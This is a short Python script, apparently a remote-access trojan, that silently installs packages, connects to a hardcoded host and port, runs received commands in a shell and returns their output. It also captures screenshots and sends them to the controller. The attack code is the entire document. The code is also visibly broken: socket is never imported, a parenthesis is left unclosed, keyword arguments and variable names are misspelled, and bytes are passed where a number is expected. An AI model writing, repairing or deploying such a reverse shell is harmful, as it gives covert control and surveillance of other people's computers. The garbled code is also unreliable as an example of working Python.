import os
try :
    from subprocess import *
    import pyautogui
    import tqdm
except:
    os.system("pip install pyautogui > install.txt")
    os.system("pip3 install tqdm > install.txt")
    os.system("rm install.txt")


import time , sys
import pyautogui
import tqdm
from subprocess import *

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.110"
port = 5050
SEPARATOR = "<SEPARATOR>"

def os_check(use_sudo):
    from platform import system
    if system == "Linux":
        use_sudo = True
    else:
        use_sudo = False
def server_connection():
    try:
        s.connect((host, port))
    except:
        return server_connection()
def secreen():
    for i in range(data[2:].encode("utf-8")):
        screenshot = pyautogui.screenshot()
        img = screenshot.save(f"target{i}.png")
        img_size = os.path.getsize(img)
        s.send(f"{img}{SEPARATOR}{img_size}".encode("utf-8")








def reverse_shell():
    while True:
        data = s.recv(1024)
        if data[0:].encode("utf-8") == "cd":
            os.chdir(data[3:].encode("utf-8"))
        if data[0:].encode("utf-8") == "screenshot":
            return secreen()
        if len(data) > 0:
            terminal = Popen(data[:].encode("utf-8"), shell=True , stout=PIPE , stderr=PIPE , stdin=PIPE)
            outputs_bites = terminal.stdout.read() + terminal.stderr.read() 
            output_str = str(outputs_bites , "utf-8") 
            s.send(str.encode(outputs_str))
    s.close()

server_connection()
reverse_shell()